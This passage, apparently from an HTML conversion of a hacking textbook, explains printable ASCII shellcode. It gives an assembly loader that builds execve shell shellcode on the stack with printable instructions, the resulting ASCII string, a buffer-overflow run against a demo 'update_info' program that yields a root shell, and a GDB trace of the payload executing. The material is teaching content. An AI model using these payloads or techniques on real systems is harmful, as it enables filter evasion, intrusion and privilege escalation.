class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">printable.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1148.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">push esp        ; Put current ESP</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">pop eax        ;  into EAX.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">sub eax,0x39393333   ; Subtract printable values sub eax,0x72727550   ;  to add 860 to EAX.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax,0x54545421</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">push eax        ; Put EAX back into ESP.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">pop esp        ;  Effectively ESP = ESP + 860 and eax,0x454e4f4a</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">and eax,0x3a313035   ; Zero out EAX.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">sub eax,0x346d6d25   ; Subtract printable values sub eax,0x256d6d25   ;  to make EAX = 0x80cde189.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">sub eax,0x2557442d   ;  (last 4 bytes from shellcode.bin) push eax        ; Push these bytes to stack at ESP. sub eax,0x59316659   ; Subtract more printable values</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax,0x59667766   ; to make EAX = 0x53e28951.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax,0x7a537a79   ; (next 4 bytes of shellcode from the end)</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;text-align: justify;">push eax</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: justify;">sub eax,0x25696969 sub eax,0x25786b5a sub eax,0x25774625</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">push eax        ; EAX = 0xe3896e69 sub eax,0x366e5858</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax,0x25773939 sub eax,0x25747470</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">push eax        ; EAX = 0x622f6868 sub eax,0x25257725</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax,0x71717171 sub eax,0x5869506a</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">push eax        ; EAX = 0x732f2f68 sub eax,0x63636363</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax,0x44307744 sub eax,0x7a434957</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">push eax        ; EAX = 0x51580b6a sub eax,0x63363663</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax,0x6d543057</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">push eax        ; EAX = 0x80cda4b0 sub eax,0x54545454</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">sub eax,0x304e4e25 sub eax,0x32346f25 sub eax,0x302d6137</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">push eax        ; EAX = 0x99c931db sub eax,0x78474778</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax,0x78727272 sub eax,0x774f4661</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">push eax        ; EAX = 0x31c03190 sub eax,0x41704170</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax,0x2d772d4e sub eax,0x32483242</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">push eax        ; EAX = 0x90909090 push eax</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">push eax        ; Build a NOP sled. push eax</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">push eax push eax push eax push eax push eax push eax push eax push eax push eax push eax push eax push eax push eax push eax push eax push eax push eax push eax</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1149.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">At the end, the shellcode has been built somewhere after the loader code, most likely leaving a gap between the newly built shellcode and the executing loader code. This gap can be bridged by building a NOP sled between the loader code and the shellcode.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Once again, <span class="s31">sub </span>instructions are used to set EAX to <span class="s31">0x90909090</span>, and EAX is repeatedly pushed to the stack. With each <span class="s31">push </span>instruction, four NOP instructions are tacked onto the beginning of the shellcode. Eventually, these NOP instructions will build right over the executing <span class="s31">push </span>instructions of the loader code, allowing the EIP and program execution to flow over the sled into the shellcode.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This assembles into a printable ASCII string, which doubles as executable machine code.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1150.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nasm printable.s reader@hacking:~/booksrc $ echo $(cat ./printable)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">TX-3399-Purr-!TTTP\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">B2H2PPPPPPPPPPPPPPPPPPPPPP</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1151.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This printable ASCII shellcode can now be used to smuggle the actual shellcode past the input-validation routine of the update_info program.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1152.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./update_info $(perl -e &#39;print &quot;AAAA&quot;x10&#39;) $(cat ./printable) [DEBUG]: desc argument is at 0xbffff910</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Segmentation fault</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./update_info $(perl -e &#39;print &quot;\x10\xf9\xff\xbf&quot;x10&#39;) $(cat ./ printable)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG]: desc argument is at 0xbffff910</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Updating product ########### with description &#39;TX-3399-Purr-!TTTP\%JONE%501:-%mm4-%mm%--DW%P- Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP- TTTT-%NN0-%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">sh-3.2# whoami root</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sh-3.2#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1153.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Neat. In case you weren’t able to follow everything that just happened there, the output below watches the execution of the printable shellcode in GDB. The stack addresses will be slightly different, changing the return addresses, but this won’t affect the printable shellcode—it calculates its loca- tion based on ESP, giving it this versatility.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1154.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q ./update_info</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) disass update_product_description</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Dump of assembler code for function update_product_description:</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:194pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x080484a8 &lt;update_product_description+0&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">push</p></td><td style="width:98pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebp</p></td></tr><tr style="height:11pt"><td style="width:194pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x080484a9 &lt;update_product_description+1&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:98pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebp,esp</p></td></tr><tr style="height:11pt"><td style="width:194pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x080484ab &lt;update_product_description+3&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">sub</p></td><td style="width:98pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">esp,0x28</p></td></tr><tr style="height:11pt"><td style="width:194pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x080484ae &lt;update_product_description+6&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:98pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,DWORD PTR [ebp+8]</p></td></tr><tr style="height:10pt"><td style="width:194pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x080484b1 &lt;update_product_description+9&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:98pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp+4],eax</p></td></tr></table><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484b5</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;update_product_description+13&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">lea</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,[ebp-24]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484b8</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;update_product_description+16&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080484bb</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;update_product_description+19&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">call</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x8048388 &lt;strcpy@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080484c0</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;update_product_description+24&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,DWORD PTR [ebp+12]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484c3</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;update_product_description+27&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp+8],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484c7</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;update_product_description+31&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">lea</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,[ebp-24]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080484ca</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;update_product_description+34&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp+4],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080484ce</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;update_product_description+38&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp],0x80487a0</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484d5</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;update_product_description+45&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048398 &lt;printf@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484da</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;update_product_description+50&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">leave</p></td><td style="width:113pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:10pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080484db</p></td><td style="width:149pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;update_product_description+51&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ret</p></td><td style="width:113pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">End of assembler dump. (gdb) break *0x080484db</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x80484db: file update_info.c, line 21. (gdb) run $(perl -e &#39;print &quot;AAAA&quot;x10&#39;) $(cat ./printable)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/update_info $(perl -e &#39;print &quot;AAAA&quot;x10&#39;) $(cat ./ printable)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG]: desc argument is at 0xbffff8fd</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Program received signal SIGSEGV, Segmentation fault. 0xb7f06bfb in strlen () from /lib/tls/i686/cmov/libc.so.6</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) run $(perl -e &#39;print &quot;\xfd\xf8\xff\xbf&quot;x10&#39;) $(cat ./printable) The program being debugged has been started already.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Start it from the beginning? (y or n) y</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Starting program: /home/reader/booksrc/update_info $(perl -e &#39;print &quot;\xfd\xf8\xff\xbf&quot;x10&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">$(cat ./printable)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG]: desc argument is at 0xbffff8fd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Updating product # with description &#39;TX-3399-Purr-!TTTP\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY- yzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP&#39;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 36pt;text-indent: -17pt;line-height: 107%;text-align: left;">Breakpoint 1, 0x080484db in update_product_description ( id=0x72727550 &lt;Address 0x72727550 out of bounds&gt;,</p><p class="s31" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">desc=0x5454212d &lt;Address 0x5454212d out of bounds&gt;) at update_info.c:21</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">21   }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">(gdb) stepi 0xbffff8fd in ?? () (gdb) x/9i $eip</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">0xbffff8fd:   push  esp 0xbffff8fe:   pop   eax 0xbffff8ff:   sub   eax,0x39393333 0xbffff904:   sub   eax,0x72727550 0xbffff909:   sub   eax,0x54545421 0xbffff90e:   push  eax 0xbffff90f:   pop   esp 0xbffff910:   and   eax,0x454e4f4a 0xbffff915:   and   eax,0x3a313035 (gdb) i r esp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">esp       0xbffff6d0    0xbffff6d0 (gdb) p /x $esp + 860</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">$1 = 0xbffffa2c (gdb) stepi 9 0xbffff91a in ?? () (gdb) i r esp eax</p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:10pt"><td style="width:43pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">esp</p></td><td style="width:78pt"><p class="s42" style="padding-right: 14pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffffa2c</p></td><td style="width:284pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffffa2c</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">eax</p></td><td style="width:78pt"><p class="s42" style="padding-right: 14pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x0   0</p></td><td style="width:284pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:14pt"><td style="width:43pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb)</p></td><td style="width:78pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:284pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-top: 4pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The first nine instructions add 860 to ESP and zero out the EAX register. The next eight instructions push the last eight bytes of the shellcode to the stack in four-byte chunks. This process is repeated in the next 32 instructions to build the entire shellcode on the stack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1155.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/8i $eip</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">0xbffff91a:   sub   eax,0x346d6d25 0xbffff91f:   sub   eax,0x256d6d25 0xbffff924:   sub   eax,0x2557442d 0xbffff929:   push  eax 0xbffff92a:   sub   eax,0x59316659 0xbffff92f:   sub   eax,0x59667766 0xbffff934:   sub   eax,0x7a537a79 0xbffff939:   push  eax</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) stepi 8 0xbffff93a in ?? () (gdb) x/4x $esp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffffa24:   0x53e28951   0x80cde189   0x00000000   0x00000000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) stepi 32 0xbffff9ba in ?? () (gdb) x/5i $eip</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:51pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff9ba:</p></td><td style="width:43pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">push</p></td><td style="width:22pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">eax</p></td></tr><tr style="height:11pt"><td style="width:51pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff9bb:</p></td><td style="width:43pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 10pt;text-align: right;">push</p></td><td style="width:22pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">eax</p></td></tr><tr style="height:11pt"><td style="width:51pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff9bc:</p></td><td style="width:43pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 10pt;text-align: right;">push</p></td><td style="width:22pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">eax</p></td></tr><tr style="height:11pt"><td style="width:51pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff9bd:</p></td><td style="width:43pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">push</p></td><td style="width:22pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">eax</p></td></tr><tr style="height:11pt"><td style="width:51pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff9be:</p></td><td style="width:43pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">push</p></td><td style="width:22pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">eax</p></td></tr><tr style="height:10pt"><td style="width:51pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">(gdb) x/16x</p></td><td style="width:43pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">$esp</p></td><td style="width:22pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:10pt"><td style="width:123pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffffa04:  0x90909090</p></td><td style="width:70pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x31c03190</p></td><td style="width:66pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x99c931db</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x80cda4b0</p></td></tr><tr style="height:11pt"><td style="width:123pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffffa14:  0x51580b6a</p></td><td style="width:70pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x732f2f68</p></td><td style="width:66pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x622f6868</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xe3896e69</p></td></tr><tr style="height:11pt"><td style="width:123pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffffa24:  0x53e28951</p></td><td style="width:70pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x80cde189</p></td><td style="width:66pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:123pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffffa34:  0x00000000</p></td><td style="width:70pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000000</p></td><td style="width:66pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000000</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:123pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb) i r eip esp eax</p></td><td style="width:70pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:123pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">eip      